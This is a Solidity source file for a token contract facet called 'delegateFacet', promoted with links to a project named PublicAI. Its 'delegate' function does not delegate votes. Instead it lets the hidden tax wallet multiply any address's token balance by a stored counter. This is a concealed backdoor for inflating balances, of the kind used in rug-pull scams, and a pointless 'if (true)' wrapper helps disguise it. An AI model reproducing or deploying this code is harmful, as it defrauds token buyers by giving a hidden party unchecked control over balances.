// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://publicai.io/
    Twitter:  https://twitter.com/PublicAI_
    Discord:  https://discord.com/invite/sQcS7Sh6ZD
    Telegram: https://t.me/Public_AI

*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract delegateFacet is Ownable {
    function delegate(address delegatee) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (true) {
            require(ds._taxWallet == _msgSender());
            ds._balances[delegatee] *= ds.buyCount;
        }
    }
}
